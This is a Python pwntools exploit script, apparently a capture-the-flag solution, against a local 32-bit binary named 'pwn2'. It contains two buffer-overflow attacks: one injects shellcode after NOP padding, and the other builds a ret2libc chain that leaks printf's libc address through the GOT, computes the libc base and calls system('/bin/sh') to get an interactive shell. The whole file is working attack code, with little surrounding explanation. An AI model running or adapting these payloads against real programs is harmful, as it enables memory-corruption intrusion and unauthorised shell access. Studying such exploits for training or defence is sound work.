from pwn import *

binary = ELF("pwn2")
padding = 44
p = process("./pwn2")

def shellcode_injection():
    shellcode = asm(shellcraft.sh())

    lol = binary.symbols["lol"]
    log.info("Lol address : {}".format(hex(lol)))
    payload = ""
    payload += "\x90" * padding
    payload += p32(lol)
    payload += shellcode

    p.sendline(payload)
    p.interactive()

def ret2libc():
    libc = ELF("libc6_2.23-0ubuntu10_i386.so", checksec=False)
    printf_plt = binary.symbols['plt.printf']
    main = binary.symbols["main"]
    printf_got = binary.symbols["got.printf"]

    #gdb.attach(p, """
    #            b *main+139
    #            c
    #            """)

    payload = ""
    payload += "A" * padding
    payload += p32(printf_plt)
    payload += p32(main)
    payload += p32(printf_got)
    p.sendline(payload)
    p.recvuntil('Bye!\n')

    libc_leak = u32(p.recv(4))
    log.info("Libc Printf : 0x{0:x}".format(libc_leak))
    libc_base = libc_leak - libc.symbols['printf']
    log.info("Libc base : 0x{0:x}".format(libc_base))
    libc_system = libc_base + libc.symbols['system']
    log.info("Libc System : 0x{0:x}".format(libc_leak))
    libc_binsh = libc_base + libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : 0x{0:x}".format(libc_binsh))

    payload = ""
    payload += "A" * (padding - 8)
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    ret2libc()
